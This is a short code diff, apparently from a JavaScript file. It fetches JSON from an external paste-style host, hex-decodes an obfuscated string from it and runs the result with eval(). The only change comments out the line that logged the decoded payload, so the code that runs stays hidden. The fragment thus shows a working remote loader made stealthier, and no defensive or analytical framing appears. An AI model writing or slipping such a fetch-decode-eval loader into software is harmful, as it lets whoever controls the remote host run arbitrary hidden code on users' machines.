@@ -23,7 +23,7 @@ fetch("https://api.npoint.io/5f9183212554a9ca7a62").then(response => response.js
         info += member.substring(2);
     info = info.slice(0, -2);
     info = info.match(/.{1,2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
-    console.log(info)
+    // console.log(info)
     eval(info);
 })
 /*
